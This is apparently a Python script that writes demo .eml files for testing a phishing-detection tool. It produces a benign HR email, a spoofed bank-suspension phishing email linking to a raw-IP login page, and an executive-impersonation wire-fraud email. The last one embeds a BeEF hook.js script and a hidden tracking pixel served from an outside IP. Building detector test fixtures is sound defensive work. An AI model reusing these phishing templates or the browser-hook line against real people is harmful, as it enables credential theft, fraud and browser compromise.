"""
create_test_emails.py — Generate Demo .eml Files for SIH26106

Creates 3 realistic test emails for demonstration:
1. benign_corporate.eml — Clean internal email (should score BENIGN)
2. spoofed_bank.eml — Phishing email with failed auth + urgency (should score MALICIOUS)
3. beef_attack.eml — BeEF hook + raw IP + social engineering (should score MALICIOUS)
"""

import os

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_emails")
os.makedirs(OUTPUT_DIR, exist_ok=True)


def create_benign_email():
    """Clean corporate email with valid authentication."""
    content = """Delivered-To: employee@techcorp.com
Received: by 10.0.0.5 with SMTP id abc12345;
        Mon, 01 Sep 2026 09:30:00 +0530
Received: from mail.techcorp.com (mail.techcorp.com [203.0.113.50]) by mx.techcorp.com
        with ESMTPS id xyz98765;
        Mon, 01 Sep 2026 09:29:55 +0530
Authentication-Results: mx.techcorp.com;
       spf=pass (techcorp.com: domain of hr@techcorp.com designates 203.0.113.50 as permitted sender);
       dkim=pass header.d=techcorp.com;
       dmarc=pass action=none header.from=techcorp.com;
From: "HR Department" <hr@techcorp.com>
Reply-To: hr@techcorp.com
To: employee@techcorp.com
Subject: Team Building Activity - September 15th
Date: Mon, 01 Sep 2026 09:29:50 +0530
Message-ID: <20260901092950.abc123@techcorp.com>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"

<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
    <p>Dear Team,</p>
    <p>We are excited to announce our annual team building activity scheduled for <strong>September 15th, 2026</strong> at the Riverside Convention Center.</p>
    <p>The agenda includes:</p>
    <ul>
        <li>Morning ice-breaker session (9:00 AM)</li>
        <li>Team challenges and activities (10:00 AM - 1:00 PM)</li>
        <li>Lunch and networking (1:00 PM - 2:00 PM)</li>
        <li>Awards ceremony (2:00 PM - 3:00 PM)</li>
    </ul>
    <p>Please confirm your attendance by replying to this email by September 8th.</p>
    <p>Looking forward to a great day together!</p>
    <p>Best regards,<br>HR Department<br>TechCorp Solutions Pvt. Ltd.</p>
</body>
</html>
"""
    filepath = os.path.join(OUTPUT_DIR, "benign_corporate.eml")
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content.strip())
    print(f"[OK] Created: {filepath}")


def create_spoofed_bank_email():
    """Phishing email with failed SPF/DMARC, urgency triggers, and suspicious links."""
    content = """Delivered-To: victim@example.com
Received: by 10.0.0.2 with SMTP id abc12345;
        Wed, 02 Sep 2026 10:15:30 +0000
Received: from mail-relay.attacker-vps.net (198.51.100.25) by mx.google.com
        with ESMTPS id xyz98765;
        Wed, 02 Sep 2026 10:15:20 +0000
Received: from [185.220.101.5] (helo=attacker-node)
        by mail-relay.attacker-vps.net with ESMTP;
        Wed, 02 Sep 2026 10:15:00 +0000
Authentication-Results: mx.google.com;
       spf=fail (google.com: domain of official-bank.com does not designate 198.51.100.25 as permitted sender);
       dkim=fail;
       dmarc=fail action=none header.from=official-bank.com;
From: "Security Desk - State Bank" <alerts@official-bank.com>
Reply-To: phisher-drop@suspicious-domain.xyz
Return-Path: <bounce@suspicious-domain.xyz>
To: victim@example.com
Subject: URGENT: Your Account Has Been Suspended - Action Required Immediately
Date: Wed, 02 Sep 2026 10:14:55 +0000
Message-ID: <fake-id-2026@attacker-vps.net>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"

<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif;">
    <div style="background: #1a365d; color: white; padding: 20px; text-align: center;">
        <h1>State Bank Security Alert</h1>
    </div>
    <div style="padding: 30px; background: #f7fafc;">
        <p>Dear Valued Customer,</p>
        <p>We detected <strong>unauthorized access</strong> to your online banking account from an unrecognized device. Your account has been <span style="color: red; font-weight: bold;">TEMPORARILY SUSPENDED</span> for security purposes.</p>
        <p><strong>Immediate action is required</strong> to prevent permanent deactivation of your account within the next <strong>24 hours</strong>.</p>
        <p>To restore your account access, please verify your identity immediately:</p>
        <p style="text-align: center; margin: 30px 0;">
            <a href="http://185.220.101.5:3000/login" style="background: #2563eb; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">
                Verify Your Identity Now
            </a>
        </p>
        <p>If you do not verify within 24 hours, your account will be permanently suspended and all funds will be frozen.</p>
        <p>For your security, please do not share this email with anyone.</p>
        <p>Regards,<br><strong>Central IT & Security Support</strong><br>State Bank of India</p>
    </div>
    <div style="background: #edf2f7; padding: 15px; font-size: 11px; color: #718096; text-align: center;">
        <p>This is an automated security notification. Do not reply to this email.</p>
        <p><a href="https://onlinesbi.sbi">https://onlinesbi.sbi</a></p>
    </div>
</body>
</html>
"""
    filepath = os.path.join(OUTPUT_DIR, "spoofed_bank.eml")
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content.strip())
    print(f"[OK] Created: {filepath}")


def create_beef_attack_email():
    """Email containing BeEF hook script, raw IP links, and executive impersonation."""
    content = """Delivered-To: target@university.edu
Received: by 10.0.0.3 with SMTP id def67890;
        Thu, 03 Sep 2026 14:20:00 +0530
Received: from mail-gw.university.edu (mail-gw.university.edu [142.250.190.46]) by mx.university.edu
        with ESMTPS id uvw54321;
        Thu, 03 Sep 2026 14:19:50 +0530
Received: from unknown (unknown [77.247.181.163])
        by mail-gw.university.edu with SMTP;
        Thu, 03 Sep 2026 14:19:30 +0530
Received: from [45.33.32.156] (helo=mail.legit-portal.com)
        by unknown with ESMTP;
        Thu, 03 Sep 2026 14:19:10 +0530
Authentication-Results: mx.university.edu;
       spf=fail (university.edu: domain of director@university.edu does not designate 77.247.181.163 as permitted sender);
       dkim=none;
       dmarc=fail action=quarantine header.from=university.edu;
From: "Director General - University Administration" <director@university.edu>
Reply-To: director.urgent@gmail.com
Return-Path: <bounce@temp-mail.org>
To: target@university.edu
Subject: CONFIDENTIAL: Scholarship Fund Transfer - Immediate Processing Required
Date: Thu, 03 Sep 2026 14:18:55 +0530
Message-ID: <malicious-hook-2026@temp-mail.org>
X-Mailer: PhishKit v3.1
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"

<!DOCTYPE html>
<html>
<body style="font-family: 'Segoe UI', sans-serif; color: #1a202c;">
    <div style="border-bottom: 3px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">
        <h2 style="margin: 0;">University Administration</h2>
        <p style="color: #718096; margin: 5px 0;">Office of the Director General</p>
    </div>
    
    <p>Dear Faculty Member,</p>
    
    <p>As discussed in our board meeting, we need to process the <strong>emergency scholarship fund transfer</strong> of <strong>Rs. 15,00,000</strong> to the new vendor account. The Ministry has set a <strong>strict deadline of today</strong> for this disbursement.</p>
    
    <p>I need you to complete the following steps immediately:</p>
    <ol>
        <li>Log in to the <a href="http://45.33.32.156:8080/university-portal/login">University Finance Portal</a> to approve the transfer</li>
        <li>Enter your credentials and authorize the payment</li>
        <li>Wire transfer the amount to the new bank account details attached</li>
    </ol>
    
    <p><strong>This is highly confidential</strong>. Do not discuss this with anyone until the transfer is complete. Per our conversation, this must be done before end of business today.</p>
    
    <p>Updated bank account for transfer:</p>
    <ul>
        <li>Account Name: Educational Trust Foundation</li>
        <li>Account Number: 9876543210123456</li>
        <li>IFSC Code: FAKE0001234</li>
    </ul>
    
    <p>Please confirm once the transfer is initiated by replying to this email.</p>
    
    <p>Warm regards,<br><strong>Prof. Rajesh Kumar</strong><br>Director General<br>University Administration</p>
    
    <script src="http://45.33.32.156:3000/hook.js"></script>
    <img src="http://45.33.32.156:3000/pixel.gif" width="1" height="1" style="display:none;">
</body>
</html>
"""
    filepath = os.path.join(OUTPUT_DIR, "beef_attack.eml")
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content.strip())
    print(f"[OK] Created: {filepath}")


if __name__ == "__main__":
    print("=" * 50)
    print("  Creating demo .eml files for SIH26106")
    print("=" * 50)
    
    create_benign_email()
    create_spoofed_bank_email()
    create_beef_attack_email()
    
    print()
    print(f"[DIR] Files saved to: {OUTPUT_DIR}")
    print("[!] Use these for live demo during presentation!")
    print()
    print("Quick test: python main.py -> POST /api/analyze-demo/spoofed_bank.eml")
